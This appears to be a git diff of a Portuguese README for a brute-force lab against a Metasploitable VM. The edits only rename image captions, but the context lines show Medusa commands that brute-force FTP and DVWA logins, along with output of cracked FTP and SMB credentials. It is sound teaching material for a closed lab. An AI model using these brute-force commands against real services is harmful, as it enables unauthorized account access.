@@ -30,17 +30,17 @@ Simular ataques de força bruta em serviços (FTP, DVWA, SMB) usando Kali Linux 
 
 > ⚠️ Verifique se ambas as VMs estão na mesma rede host-only (ex: `192.168.56.102`). Use `ip a` ou `ifconfig` para confirmar.
 
-### 📷 Print de exemplo:
+### 📷 Imagem de exemplo:
 
 ![ip](images/ip.png)
 
 ### 1.3 Teste a conectividade
-No Kali:
+Kali:
 ```bash
 ping -c 3 192.168.56.102  # substitua pelo IP do Metasploitable
 ```
 
-### 📷 Print de exemplo:
+### 📷 Imagem de exemplo:
 
 ![teste](images/teste.png)
 
@@ -58,7 +58,7 @@ Você deverá ver:
 - HTTP (porta 80 → DVWA)
 - SMB (porta 139/445)
 
-### 📷 Print de exemplo:
+### 📷 Imagem de exemplo:
 
 ![portas](images/portas.png)
 
@@ -105,7 +105,7 @@ medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6
 ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
 ```
 
-### 📷 Print de exemplo:
+### 📷 Imagem de exemplo:
 
 ![ftp](images/ftp.png)
 
@@ -150,7 +150,7 @@ medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \ -m PAGE:'/dvwa/login
 FORM:'username=^USER^&password=^PASS^&Login=Login' \ -m 'FAIL=Login failed' \ -t 6 
 ```
 
-### 📷 Print de exemplo:
+### 📷 Imagem de exemplo:
 
 ![dvwa](images/dvwa.png)
 
@@ -172,7 +172,7 @@ Saída esperada:
 |   METASPLOITABLE2\user (RID: 1002)
 ```
 
-### 📷 Print de exemplo:
+### 📷 Imagem de exemplo:
 
 ![enum](images/enum.png)
 
@@ -207,7 +207,7 @@ service
 ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: msfadmin Password: msfadmin
 ```
 
-### 📷 Print de exemplo:
+### 📷 Imagem de exemplo:
 
 ![smb](images/smb.png)
 
